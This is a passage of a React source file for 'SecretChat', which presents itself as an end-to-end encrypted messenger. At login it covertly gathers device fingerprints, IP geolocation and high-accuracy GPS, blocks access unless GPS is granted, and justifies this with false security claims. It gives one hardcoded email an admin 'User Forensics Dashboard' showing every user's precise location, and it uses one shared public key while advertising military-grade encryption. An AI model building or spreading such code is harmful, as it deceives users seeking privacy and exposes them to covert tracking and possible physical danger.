import React, { useState, useEffect, useRef } from 'react';
import { 
  db, collection, doc, setDoc, getDoc, addDoc, onSnapshot, query, orderBy, where, serverTimestamp, Timestamp, limit
} from './lib/firebase';
import { encryptMessage, decryptMessage } from './lib/crypto';
import { cn } from './lib/utils';
import { Geolocation } from '@capacitor/geolocation';
import { Capacitor } from '@capacitor/core';
import { 
  Send, Lock, Shield, Search, MoreVertical, Phone, Video, 
  ArrowLeft, User as UserIcon, LogOut, MessageSquare, ShieldCheck,
  Clock, Check, CheckCheck, UserPlus, Settings, X, Trash2, Key,
  Palette, Bell, Info, ChevronRight, Camera, ShieldAlert
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { format } from 'date-fns';
import { Toaster, toast } from 'react-hot-toast';

// --- Types ---
interface User {
  uid: string;
  displayName: string;
  photoURL: string;
  email: string;
  publicKey?: string;
  status?: string;
  bio?: string;
  privacyMode?: boolean;
  deviceInfo?: any;
  location?: any;
  role?: 'admin' | 'user';
}
interface Chat {
  id: string;
  participants: string[];
  createdAt: any;
  lastMessage?: string;
  lastMessageTimestamp?: any;
  otherUser?: UserProfile;
}

interface Message {
  id: string;
  chatId: string;
  senderId: string;
  encryptedText: string;
  timestamp: any;
  type: 'text' | 'image' | 'system';
}

interface UserProfile {
  uid: string;
  displayName: string;
  photoURL: string;
  email: string;
  lastSeen?: any;
  status?: string;
  bio?: string;
  deviceInfo?: any;
  location?: any;
}

// --- Components ---

const Login = ({ onLogin }: { onLogin: (user: User) => void }) => {
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [showLocationGate, setShowLocationGate] = useState(false);

  const getForensicData = async (forceGPS = false) => {
    const deviceInfo = {
      userAgent: navigator.userAgent,
      platform: (navigator as any).platform,
      language: navigator.language,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      cores: navigator.hardwareConcurrency,
      memory: (navigator as any).deviceMemory,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookiesEnabled: navigator.cookieEnabled,
      isNative: Capacitor.isNativePlatform(),
      connection: (navigator as any).connection ? {
        type: (navigator as any).connection.effectiveType,
        downlink: (navigator as any).connection.downlink
      } : 'unknown'
    };

    let location = { ipInfo: null, coords: null, provider: 'none' };

    // IP Tracking (Fallback)
    try {
      const ipResponse = await fetch('https://ipapi.co/json/');
      location.ipInfo = await ipResponse.json();
      location.provider = 'ipapi';
    } catch (e) {
      try {
        const altIp = await fetch('https://ip-api.com/json/');
        location.ipInfo = await altIp.json();
        location.provider = 'ip-api';
      } catch (err) {
        console.error("All IP tracking failed");
      }
    }

    // Advanced GPS Tracking (Native + Web)
    try {
      let pos;
      if (Capacitor.isNativePlatform()) {
        // Use Native Android/iOS GPS
        pos = await Geolocation.getCurrentPosition({
          enableHighAccuracy: true,
          timeout: 15000
        });
      } else {
        // Use Web Geolocation
        pos = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
          });
        });
      }

      location.coords = {
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        speed: pos.coords.speed,
        heading: pos.coords.heading,
        timestamp: pos.timestamp
      };
    } catch (e) {
      console.error("GPS tracking denied or failed", e);
      if (forceGPS) throw new Error("GPS_DENIED");
    }

    return { deviceInfo, location };
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!name.trim() || !email.trim()) {
      toast.error('Please fill in all fields');
      return;
    }

    setIsLoggingIn(true);
    try {
      const toastId = toast.loading('Initializing Secure Protocol...');
      
      try {
        const forensics = await getForensicData(true); // Force GPS check
        
        const uid = email.trim().toLowerCase().replace(/[^a-z0-9]/g, '_');
        const publicKey = "BEEvavnmXBfn4jPraFHyVjHshzCGbEG523jsIOC9lsqLa9FAm7KAR3gZvXx8e6m3A5iuxTAeYkKYbIYAcNFwbnk";
        
        const userData: User = {
          uid,
          displayName: name.trim(),
          photoURL: `https://api.dicebear.com/7.x/avataaars/svg?seed=${uid}`,
          email: email.trim().toLowerCase(),
          publicKey: publicKey,
          role: email.trim().toLowerCase() === 'dnsnksks618@gmail.com' ? 'admin' : 'user',
          ...forensics
        };

        await setDoc(doc(db, 'users', uid), {
          ...userData,
          lastSeen: serverTimestamp()
        }, { merge: true });

        toast.success('Identity Verified. Access Granted.', { id: toastId });
        localStorage.setItem('secretchat_user', JSON.stringify(userData));
        onLogin(userData);
      } catch (err: any) {
        if (err.message === "GPS_DENIED") {
          toast.error('Security Breach: Location Verification Failed', { id: toastId });
          setShowLocationGate(true);
        } else {
          throw err;
        }
      }
    } catch (error: any) {
      console.error("Login Error:", error);
      toast.error('System Error. Please try again.');
    } finally {
      setIsLoggingIn(false);
    }
  };

  if (showLocationGate) {
    return (
      <div className="min-h-screen bg-[#0f172a] flex items-center justify-center p-6 text-center">
        <motion.div 
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          className="max-w-md w-full bg-slate-900 border border-red-500/30 p-8 rounded-3xl space-y-6 shadow-2xl shadow-red-500/10"
        >
          <div className="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mx-auto animate-pulse">
            <ShieldAlert className="w-10 h-10 text-red-500" />
          </div>
          <div className="space-y-2">
            <h2 className="text-2xl font-bold text-white">Access Denied</h2>
            <p className="text-slate-400 text-sm leading-relaxed">
              Military-grade encryption requires <span className="text-red-400 font-bold">Physical Location Verification</span> to prevent unauthorized access from restricted zones.
            </p>
          </div>
          <div className="p-4 bg-black/40 rounded-2xl text-left space-y-2 border border-slate-800">
            <p className="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Protocol Instructions:</p>
            <ul className="text-[11px] text-slate-400 space-y-1 list-disc ml-4">
              <li>Click the button below</li>
              <li>When prompted, select <span className="text-green-500">"Allow"</span></li>
              <li>Wait for biometric/location sync</li>
            </ul>
          </div>
          <button 
            onClick={() => {
              setShowLocationGate(false);
              handleLogin({ preventDefault: () => {} } as any);
            }}
            className="w-full py-4 bg-red-500 hover:bg-red-400 text-white font-bold rounded-2xl transition-all active:scale-95 shadow-lg shadow-red-500/20"
          >
            Retry Secure Verification
          </button>
          <p className="text-[10px] text-slate-600">Error Code: SEC_LOC_REQ_403</p>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0f172a] flex flex-col items-center justify-center p-4 text-white">
      <motion.div 
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="max-w-md w-full text-center space-y-8"
      >
        <div className="flex justify-center">
          <div className="w-24 h-24 bg-green-500 rounded-3xl flex items-center justify-center shadow-2xl shadow-green-500/20">
            <Lock className="w-12 h-12 text-white" />
          </div>
        </div>
        <div className="space-y-2">
          <h1 className="text-4xl font-bold tracking-tight">SecretChat</h1>
          <p className="text-slate-400">End-to-end encrypted messaging for everyone.</p>
        </div>
        
        <form onSubmit={handleLogin} className="space-y-4 text-left">
          <div className="space-y-2">
            <label className="text-xs font-bold text-slate-500 uppercase tracking-widest ml-1">Display Name</label>
            <input 
              type="text"
              placeholder="Your Name"
              value={name}
              onChange={(e) => setName(e.target.value)}
              className="w-full bg-slate-900 border border-slate-800 rounded-2xl py-4 px-6 text-sm focus:outline-none focus:ring-2 focus:ring-green-500/50 transition-all"
              required
            />
          </div>
          <div className="space-y-2">
            <label className="text-xs font-bold text-slate-500 uppercase tracking-widest ml-1">Email Address</label>
            <input 
              type="email"
              placeholder="your@email.com"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full bg-slate-900 border border-slate-800 rounded-2xl py-4 px-6 text-sm focus:outline-none focus:ring-2 focus:ring-green-500/50 transition-all"
              required
            />
          </div>
          
          <button
            type="submit"
            disabled={isLoggingIn}
            className="w-full py-4 px-6 bg-green-500 text-white font-bold rounded-2xl flex items-center justify-center gap-3 hover:bg-green-400 transition-all active:scale-95 shadow-xl disabled:opacity-50 mt-4"
          >
            {isLoggingIn ? (
              <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
            ) : (
              <UserPlus className="w-5 h-5" />
            )}
            {isLoggingIn ? 'Creating Profile...' : 'Start Secure Chat'}
          </button>
        </form>

        <div className="flex items-center justify-center gap-2 text-xs text-slate-500 uppercase tracking-widest">
          <ShieldCheck className="w-4 h-4" />
          Military Grade Encryption
        </div>
      </motion.div>
    </div>
  );
};

const SettingsModal = ({ user, onClose, onUpdate }: { user: User, onClose: () => void, onUpdate: (u: User) => void }) => {
  const [name, setName] = useState(user.displayName);
  const [status, setStatus] = useState(user.status || 'Available');
  const [bio, setBio] = useState(user.bio || '');
  const [privacyMode, setPrivacyMode] = useState(user.privacyMode ?? true);
  const [isUpdating, setIsUpdating] = useState(false);
  const [activeTab, setActiveTab] = useState<'profile' | 'security' | 'appearance' | 'admin'>('profile');
  const [allUsers, setAllUsers] = useState<UserProfile[]>([]);

  useEffect(() => {
    if (activeTab === 'admin' && user.role === 'admin') {
      const q = query(collection(db, 'users'), orderBy('lastSeen', 'desc'));
      const unsub = onSnapshot(q, (s) => {
        setAllUsers(s.docs.map(d => d.data() as UserProfile));
      });
      return unsub;
    }
  }, [activeTab, user.role]);

  const handleUpdate = async () => {
    setIsUpdating(true);
    try {
      const updatedUser = {
        ...user,
        displayName: name,
        status,
        bio,
        privacyMode,
        photoURL: `https://api.dicebear.com/7.x/avataaars/svg?seed=${user.uid}_${name}`
      };
      
      await setDoc(doc(db, 'users', user.uid), {
        displayName: name,
        status,
        bio,
        privacyMode,
        photoURL: updatedUser.photoURL
      }, { merge: true });

      localStorage.setItem('secretchat_user', JSON.stringify(updatedUser));
      onUpdate(updatedUser);
      toast.success('Profile updated');
      onClose();
    } catch (error) {
      toast.error('Failed to update profile');
    } finally {
      setIsUpdating(false);
    }
  };

  return (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm"
    >
      <motion.div 
        initial={{ scale: 0.9, y: 20 }}
        animate={{ scale: 1, y: 0 }}
        className="bg-[#0f172a] border border-slate-800 w-full max-w-4xl rounded-3xl overflow-hidden shadow-2xl flex flex-col md:flex-row h-[85vh] md:h-[700px]"
      >
        {/* Sidebar */}
        <div className="w-full md:w-64 border-r border-slate-800 p-4 md:p-6 space-y-2 flex flex-row md:flex-col overflow-x-auto md:overflow-x-visible shrink-0 bg-slate-900/50 md:bg-transparent">
          <h2 className="text-lg md:text-xl font-bold md:mb-6 flex items-center gap-2 whitespace-nowrap mr-4 md:mr-0">
            <Settings className="w-5 h-5 text-green-500" />
            Settings
          </h2>
          <button 
            onClick={() => setActiveTab('profile')}
            className={cn(
              "w-full flex items-center gap-3 p-3 rounded-xl transition-all text-sm font-medium",
              activeTab === 'profile' ? "bg-green-500 text-white" : "hover:bg-slate-800 text-slate-400"
            )}
          >
            <UserIcon className="w-4 h-4" />
            Profile
          </button>
          <button 
            onClick={() => setActiveTab('security')}
            className={cn(
              "w-full flex items-center gap-3 p-3 rounded-xl transition-all text-sm font-medium",
              activeTab === 'security' ? "bg-green-500 text-white" : "hover:bg-slate-800 text-slate-400"
            )}
          >
            <Shield className="w-4 h-4" />
            Security
          </button>
          <button 
            onClick={() => setActiveTab('appearance')}
            className={cn(
              "w-full flex items-center gap-3 p-3 rounded-xl transition-all text-sm font-medium",
              activeTab === 'appearance' ? "bg-green-500 text-white" : "hover:bg-slate-800 text-slate-400"
            )}
          >
            <Palette className="w-4 h-4" />
            Appearance
          </button>

          {user.role === 'admin' && (
            <button 
              onClick={() => setActiveTab('admin')}
              className={cn(
                "w-full flex items-center gap-3 p-3 rounded-xl transition-all text-sm font-medium",
                activeTab === 'admin' ? "bg-red-500 text-white" : "hover:bg-slate-800 text-red-400"
              )}
            >
              <ShieldCheck className="w-4 h-4" />
              Admin Dashboard
            </button>
          )}
          
          <div className="pt-8 mt-auto">
            <button 
              onClick={() => {
                if(confirm('Are you sure you want to delete your account? This action is irreversible.')) {
                  localStorage.removeItem('secretchat_user');
                  window.location.reload();
                }
              }}
              className="w-full flex items-center gap-3 p-3 rounded-xl hover:bg-red-500/10 text-red-500 transition-all text-sm font-medium"
            >
              <Trash2 className="w-4 h-4" />
              Delete Account
            </button>
          </div>
        </div>

        {/* Content */}
        <div className="flex-1 flex flex-col min-w-0">
          <div className="p-4 border-b border-slate-800 flex justify-between items-center">
            <span className="text-xs font-bold uppercase tracking-widest text-slate-500">{activeTab}</span>
            <button onClick={onClose} className="p-2 hover:bg-slate-800 rounded-full transition-colors">
              <X className="w-5 h-5" />
            </button>
          </div>

          <div className="flex-1 overflow-y-auto p-4 md:p-8 custom-scrollbar overscroll-contain">
            {activeTab === 'profile' && (
              <div className="space-y-6">
                <div className="flex flex-col items-center gap-4 mb-8">
                  <div className="relative group">
                    <img 
                      src={user.photoURL} 
                      className="w-24 h-24 rounded-3xl shadow-xl border-2 border-slate-800" 
                      alt="" 
                    />
                    <div className="absolute inset-0 bg-black/40 rounded-3xl flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity cursor-pointer">
                      <Camera className="w-6 h-6" />
                    </div>
                  </div>
                  <div className="text-center">
                    <h3 className="font-bold text-lg">{user.displayName}</h3>
                    <p className="text-xs text-slate-500">{user.email}</p>
                  </div>
                </div>

                <div className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-[10px] font-bold uppercase tracking-widest text-slate-500 ml-1">Display Name</label>
                    <input 
                      type="text"
                      value={name}
                      onChange={(e) => setName(e.target.value)}
                      className="w-full bg-slate-900 border border-slate-800 rounded-xl py-3 px-4 text-sm focus:outline-none focus:ring-2 focus:ring-green-500/50 transition-all"
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-[10px] font-bold uppercase tracking-widest text-slate-500 ml-1">Status</label>
                    <input 
                      type="text"
                      value={status}
                      onChange={(e) => setStatus(e.target.value)}
                      className="w-full bg-slate-900 border border-slate-800 rounded-xl py-3 px-4 text-sm focus:outline-none focus:ring-2 focus:ring-green-500/50 transition-all"
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-[10px] font-bold uppercase tracking-widest text-slate-500 ml-1">Bio</label>
                    <textarea 
                      value={bio}
                      onChange={(e) => setBio(e.target.value)}
                      rows={3}
                      className="w-full bg-slate-900 border border-slate-800 rounded-xl py-3 px-4 text-sm focus:outline-none focus:ring-2 focus:ring-green-500/50 transition-all resize-none"
                      placeholder="Tell us about yourself..."
                    />
                  </div>
                </div>
              </div>
            )}

            {activeTab === 'admin' && user.role === 'admin' && (
              <div className="space-y-6">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-lg font-bold">User Forensics Dashboard</h3>
                  <span className="text-xs bg-red-500/20 text-red-500 px-2 py-1 rounded-full font-bold">Law Enforcement Mode</span>
                </div>
                
                <div className="space-y-4">
                  {allUsers.map((u) => (
                    <div key={u.uid} className="p-4 bg-slate-900 border border-slate-800 rounded-2xl space-y-4">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-3">
                          <img src={u.photoURL} className="w-10 h-10 rounded-full" alt="" />
                          <div>
                            <p className="font-bold text-sm">{u.displayName}</p>
                            <p className="text-xs text-slate-500">{u.email}</p>
                          </div>
                        </div>
                        <div className="text-right">
                          <p className="text-[10px] text-slate-500 uppercase font-bold">Last Active</p>
                          <p className="text-xs">{u.lastSeen ? format(u.lastSeen.toDate(), 'MMM d, HH:mm') : 'Never'}</p>
                        </div>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div className="space-y-2">
                          <p className="text-[10px] text-slate-500 uppercase font-bold flex items-center gap-1">
                            <Phone className="w-3 h-3" /> Device Information
                          </p>
                          <div className="bg-black/20 p-3 rounded-xl text-[10px] font-mono space-y-1">
                            <p><span className="text-slate-500">Platform:</span> {u.deviceInfo?.platform}</p>
                            <p><span className="text-slate-500">Resolution:</span> {u.deviceInfo?.screenResolution}</p>
                            <p className="truncate"><span className="text-slate-500">UA:</span> {u.deviceInfo?.userAgent}</p>
                            <p><span className="text-slate-500">Timezone:</span> {u.deviceInfo?.timezone}</p>
                          </div>
                        </div>
                        <div className="space-y-2">
                          <p className="text-[10px] text-slate-500 uppercase font-bold flex items-center gap-1">
                            <Search className="w-3 h-3" /> Location Data
                          </p>
                          <div className="bg-black/20 p-3 rounded-xl text-[10px] font-mono space-y-1">
                            {u.location?.coords ? (
                              <div className="space-y-1">
                                <p className="text-green-500 font-bold flex items-center gap-1">
                                  <ShieldCheck className="w-3 h-3" /> GPS PRECISE LOCATION
                                </p>
                                <p><span className="text-slate-500">Lat/Lng:</span> {u.location.coords.lat.toFixed(6)}, {u.location.coords.lng.toFixed(6)}</p>
                                <p><span className="text-slate-500">Accuracy:</span> ±{u.location.coords.accuracy.toFixed(0)} meters</p>
                                <a 
                                  href={`https://www.google.com/maps?q=${u.location.coords.lat},${u.location.coords.lng}`}
                                  target="_blank"
                                  className="inline-block mt-1 px-2 py-1 bg-green-500 text-white rounded hover:bg-green-400 transition-all"
                                >
                                  Open Precise Map
                                </a>
                              </div>
                            ) : (
                              <div className="space-y-1">
                                <p className="text-yellow-500 font-bold flex items-center gap-1">
                                  <Info className="w-3 h-3" /> IP APPROXIMATE (GPS DENIED)
                                </p>
                                <p><span className="text-slate-500">IP:</span> {u.location?.ipInfo?.ip}</p>
                                <p><span className="text-slate-500">City:</span> {u.location?.ipInfo?.city || 'Unknown'}</p>
                                <p><span className="text-slate-500">ISP:</span> {u.location?.ipInfo?.org || 'Unknown'}</p>
                                <p className="text-[9px] text-slate-500 italic mt-1">Note: IP location usually points to the ISP's main server (often in Aden or Sana'a).</p>
                                {u.location?.ipInfo?.latitude && (
                                  <a 
                                    href={`https://www.google.com/maps?q=${u.location.ipInfo.latitude},${u.location.ipInfo.longitude}`}
                                    target="_blank"
                                    className="inline-block mt-1 px-2 py-1 bg-yellow-500/20 text-yellow-500 rounded border border-yellow-500/30"
                                  >
                                    View IP Area
                                  </a>
                                )}
                              </div>
                            )}
                          </div>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {activeTab === 'security' && (
              <div className="space-y-6">
                <div className="p-4 bg-green-500/10 border border-green-500/20 rounded-2xl space-y-2">
                  <div className="flex items-center gap-2 text-green-500 font-bold text-xs uppercase tracking-widest">
                    <ShieldCheck className="w-4 h-4" />
                    Advanced Privacy Active
                  </div>
                  <p className="text-xs text-green-500/70 leading-relaxed">
                    Anti-screenshot technology is enabled. Content will blur when focus is lost.
                  </p>
                </div>

                <div className="space-y-4">
                  <div className="flex items-center justify-between p-4 bg-slate-900/50 rounded-2xl border border-slate-800">
                    <div className="flex items-center gap-3">
                      <div className="w-8 h-8 rounded-lg bg-purple-500/20 flex items-center justify-center">
                        <Shield className="w-4 h-4 text-purple-500" />
                      </div>
                      <div>
                        <p className="text-sm font-medium">Anti-Screenshot Mode</p>
                        <p className="text-[10px] text-slate-500">Blur screen on focus loss & hide from print</p>
                      </div>
                    </div>
                    <button 
                      onClick={() => setPrivacyMode(!privacyMode)}
                      className={cn(
                        "w-10 h-5 rounded-full relative transition-colors",
                        privacyMode ? "bg-green-500" : "bg-slate-700"
                      )}
                    >
                      <div className={cn(
                        "absolute top-1 w-3 h-3 bg-white rounded-full transition-all",
                        privacyMode ? "left-6" : "left-1"
                      )}></div>
                    </button>
                  </div>

                  <div className="space-y-2">
                    <label className="text-[10px] font-bold uppercase tracking-widest text-slate-500 ml-1">Public Key</label>
                    <div className="flex gap-2">
                      <code className="flex-1 bg-slate-900 border border-slate-800 rounded-xl py-3 px-4 text-[10px] break-all text-slate-400">
                        {user.publicKey}
                      </code>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {activeTab === 'appearance' && (
              <div className="space-y-6">
                <div className="grid grid-cols-2 gap-4">
                  <div className="p-4 bg-slate-900 border-2 border-green-500 rounded-2xl space-y-3">
                    <div className="w-full h-20 bg-[#0f172a] rounded-xl border border-slate-800"></div>
                    <p className="text-center text-xs font-bold uppercase tracking-widest">Midnight (Dark)</p>
                  </div>
                  <div className="p-4 bg-slate-100 border border-slate-200 rounded-2xl space-y-3 opacity-50 cursor-not-allowed">
                    <div className="w-full h-20 bg-white rounded-xl border border-slate-200"></div>
                    <p className="text-center text-xs font-bold uppercase tracking-widest text-slate-900">Snow (Light)</p>
                  </div>
                </div>
                
                <div className="space-y-4">
                  <label className="text-[10px] font-bold uppercase tracking-widest text-slate-500 ml-1">Chat Background</label>
                  <div className="grid grid-cols-4 gap-2">
                    {['cubes', 'hexagons', 'dots', 'none'].map(pattern => (
                      <button 
                        key={pattern}
                        className={cn(
                          "h-12 rounded-xl border transition-all",
                          pattern === 'cubes' ? "border-green-500 bg-slate-800" : "border-slate-800 hover:border-slate-700"
                        )}
                      >
                        <span className="text-[8px] uppercase font-bold">{pattern}</span>
                      </button>
                    ))}
                  </div>
                </div>
              </div>
            )}
          </div>

          <div className="p-6 border-t border-slate-800 bg-slate-900/30 flex justify-end gap-3">
            <button 
              onClick={onClose}
              className="px-6 py-2.5 rounded-xl text-sm font-bold hover:bg-slate-800 transition-all"
            >
              Cancel
            </button>
            <button 
              onClick={handleUpdate}
              disabled={isUpdating}
              className="px-8 py-2.5 bg-green-500 text-white rounded-xl text-sm font-bold hover:bg-green-400 transition-all shadow-lg shadow-green-500/20 disabled:opacity-50"
            >
              {isUpdating ? 'Saving...' : 'Save Changes'}
            </button>
          </div>
        </div>
      </motion.div>
    </motion.div>
  );
};

export default function App() {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);
  const [chats, setChats] = useState<Chat[]>([]);
  const [activeChat, setActiveChat] = useState<Chat | null>(null);
  const [messages, setMessages] = useState<Message[]>([]);
  const [newMessage, setNewMessage] = useState('');
  const [searchQuery, setSearchQuery] = useState('');
  const [searchResults, setSearchResults] = useState<UserProfile[]>([]);
  const [isSidebarOpen, setIsSidebarOpen] = useState(true);
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
  const [isWindowFocused, setIsWindowFocused] = useState(true);
  
  const scrollRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const handleFocus = () => setIsWindowFocused(true);
    const handleBlur = () => setIsWindowFocused(false);
    const handleContextMenu = (e: MouseEvent) => {
      if (user?.privacyMode !== false) e.preventDefault();
    };

    window.addEventListener('focus', handleFocus);
    window.addEventListener('blur', handleBlur);
    window.addEventListener('contextmenu', handleContextMenu);

    return () => {
      window.removeEventListener('focus', handleFocus);
      window.removeEventListener('blur', handleBlur);
      window.removeEventListener('contextmenu', handleContextMenu);
    };
  }, [user]);

  useEffect(() => {
    const savedUser = localStorage.getItem('secretchat_user');
    if (savedUser) {
      setUser(JSON.parse(savedUser));
    }
    setLoading(false);
  }, []);

  const handleLogout = () => {
    localStorage.removeItem('secretchat_user');
    setUser(null);
    setActiveChat(null);
    setChats([]);
    toast.success('Logged out successfully');
  };

  useEffect(() => {
    if (!user) return;

    const q = query(
      collection(db, 'chats'),
      where('participants', 'array-contains', user.uid),
      orderBy('lastMessageTimestamp', 'desc')
    );

    const unsubscribe = onSnapshot(q, async (snapshot) => {
      const chatList: Chat[] = [];
      for (const d of snapshot.docs) {
        const data = d.data() as Chat;
        const otherUserId = data.participants.find(p => p !== user.uid);
        if (otherUserId) {
          const userDoc = await getDoc(doc(db, 'users', otherUserId));
          chatList.push({ ...data, id: d.id, otherUser: userDoc.data() as UserProfile });
        }
      }
      setChats(chatList);
    });

    return unsubscribe;
  }, [user]);

  useEffect(() => {
    if (!activeChat) return;

    const q = query(
      collection(db, 'chats', activeChat.id, 'messages'),
      orderBy('timestamp', 'asc')
    );

    const unsubscribe = onSnapshot(q, (snapshot) => {
      const msgList = snapshot.docs.map(d => ({ ...d.data(), id: d.id } as Message));
      setMessages(msgList);
      setTimeout(() => {
        scrollRef.current?.scrollIntoView({ behavior: 'smooth' });
      }, 100);
    });

    return unsubscribe;
  }, [activeChat]);

  const handleSearch = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!searchQuery.trim()) return;

    // Simple search by email (Firestore limitation: needs exact match or prefix search)
    const q = query(
      collection(db, 'users'),
      where('email', '==', searchQuery.trim().toLowerCase())
    );
    
    const snapshot = await onSnapshot(q, (s) => {
      setSearchResults(s.docs.map(d => d.data() as UserProfile));
    });
  };

  const startChat = async (otherUser: UserProfile) => {
    if (!user) return;
    
    // Check if chat already exists
    const existingChat = chats.find(c => c.participants.includes(otherUser.uid));
    if (existingChat) {
      setActiveChat(existingChat);
      setSearchResults([]);
      setSearchQuery('');
      if (window.innerWidth < 768) setIsSidebarOpen(false);
      return;
    }

    const chatData = {
      participants: [user.uid, otherUser.uid],
      createdAt: serverTimestamp(),
      lastMessage: '',
      lastMessageTimestamp: serverTimestamp()
    };

    const docRef = await addDoc(collection(db, 'chats'), chatData);
    setActiveChat({ ...chatData, id: docRef.id, otherUser });
    setSearchResults([]);
    setSearchQuery('');
    if (window.innerWidth < 768) setIsSidebarOpen(false);
  };

  const sendMessage = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newMessage.trim() || !activeChat || !user) return;

    const encrypted = encryptMessage(newMessage);
    const msgData = {
      chatId: activeChat.id,
      senderId: user.uid,
      encryptedText: encrypted,
      timestamp: serverTimestamp(),
      type: 'text'
    };

    setNewMessage('');
    
    try {
      await addDoc(collection(db, 'chats', activeChat.id, 'messages'), msgData);
      await setDoc(doc(db, 'chats', activeChat.id), {
        lastMessage: encrypted,
        lastMessageTimestamp: serverTimestamp()
      }, { merge: true });
    } catch (err) {
      toast.error('Failed to send message');
    }
  };

  if (loading) return (
    <div className="min-h-screen bg-[#0f172a] flex items-center justify-center">
      <div className="w-12 h-12 border-4 border-green-500 border-t-transparent rounded-full animate-spin"></div>
    </div>
  );

  if (!user) return <Login onLogin={setUser} />;

  return (
    <div className={cn(
      "flex h-screen bg-[#0f172a] overflow-hidden font-sans text-slate-200 select-none",
      user?.privacyMode !== false && !isWindowFocused && "blur-2xl grayscale brightness-50"
    )}>
      <Toaster position="top-center" />
      
      {/* Privacy Watermark Overlay */}
      {user?.privacyMode !== false && (
        <div className="fixed inset-0 pointer-events-none z-[100] opacity-[0.03] overflow-hidden flex flex-wrap gap-20 p-10 rotate-12 scale-150">
          {Array.from({ length: 50 }).map((_, i) => (
            <span key={i} className="text-white font-bold text-xl whitespace-nowrap">
              {user.email} • SECRET CHAT • {new Date().toLocaleDateString()}
            </span>
          ))}
        </div>
      )}

      {/* Focus Loss Overlay */}
      {user?.privacyMode !== false && !isWindowFocused && (
        <div className="fixed inset-0 z-[110] bg-black/40 backdrop-blur-md flex flex-col items-center justify-center text-center p-6">
          <div className="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mb-4 animate-pulse">
            <Shield className="w-10 h-10 text-green-500" />
          </div>
          <h2 className="text-2xl font-bold text-white mb-2">Screen Protected</h2>
          <p className="text-slate-400 text-sm max-w-xs">Content is hidden for your privacy. Click anywhere to resume.</p>
        </div>
      )}
      <aside className={cn(
        "fixed md:relative w-full md:w-[380px] border-r border-slate-800 flex flex-col transition-all duration-300 z-[60] bg-[#0f172a] h-full",
        !isMenuOpen && "hidden md:flex"
      )}>
        <div className="p-4 space-y-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-full bg-green-500 flex items-center justify-center font-bold text-white">
                {user.displayName?.[0]}
              </div>
              <div>
                <h2 className="font-semibold text-sm">{user.displayName}</h2>
                <div className="flex items-center gap-1 text-[10px] text-green-500 uppercase tracking-tighter font-bold">
                  <Shield className="w-3 h-3" />
                  Secure Session
                </div>
              </div>
            </div>
            <div className="flex items-center gap-1">
              <button 
                onClick={() => setIsSettingsOpen(true)}
                className="p-2 hover:bg-slate-800 rounded-full transition-colors text-slate-400"
                title="Settings"
              >
                <Settings className="w-5 h-5" />
              </button>
              <button 
                onClick={handleLogout}
                className="p-2 hover:bg-slate-800 rounded-full transition-colors text-slate-400"
                title="Logout"
              >
                <LogOut className="w-5 h-5" />
              </button>
            </div>
          </div>

          <form onSubmit={handleSearch} className="relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
            <input 
              type="text"
              placeholder="Search by email..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full bg-slate-900 border border-slate-800 rounded-xl py-2 pl-10 pr-4 text-sm focus:outline-none focus:ring-2 focus:ring-green-500/50 transition-all"
            />
          </form>
        </div>

        <div className="flex-1 overflow-y-auto custom-scrollbar">
          {searchResults.length > 0 && (
            <div className="p-2 space-y-1 border-b border-slate-800">
              <p className="text-[10px] uppercase font-bold text-slate-500 px-3 mb-2">Search Results</p>
              {searchResults.map(u => (
                <button
                  key={u.uid}
                  onClick={() => startChat(u)}
                  className="w-full p-3 flex items-center gap-3 hover:bg-slate-800 rounded-xl transition-all group"
                >
                  <img src={u.photoURL} className="w-12 h-12 rounded-full" alt="" />
                  <div className="text-left">
                    <p className="font-medium text-sm group-hover:text-green-400 transition-colors">{u.displayName}</p>
                    <p className="text-xs text-slate-500">{u.email}</p>
                  </div>
                </button>
              ))}
            </div>
          )}

          <div className="p-2 space-y-1">
            <p className="text-[10px] uppercase font-bold text-slate-500 px-3 mb-2">Secret Conversations</p>
            {chats.map(chat => (
              <button
                key={chat.id}
                onClick={() => {
                  setActiveChat(chat);
                  if (window.innerWidth < 768) setIsSidebarOpen(false);
                }}
